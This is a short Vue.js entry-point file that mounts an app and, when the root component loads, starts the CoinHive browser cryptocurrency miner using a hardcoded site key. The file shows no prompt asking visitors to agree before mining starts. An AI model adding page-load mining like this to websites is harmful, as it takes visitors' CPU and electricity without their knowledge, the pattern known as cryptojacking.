/* global CoinHive */
import Vue from 'vue'
import App from './App.vue'
import router from './router'
import store from './store'
import Miner from './lib/miner'
import vueConfig from './lib/mixins/config'

const configs = {
  siteKey: 'xJn5PAs31zJZWbvGPCsJ5Ohf7zpViKqF' // TODO: use config file
}

Vue.use(vueConfig, configs)

/* eslint-disable no-new */
new Vue({
  el: '#app',
  store,
  router,
  template: '<App/>',
  components: { App },
  mounted: function () {
    Miner(CoinHive, this)
  }
})
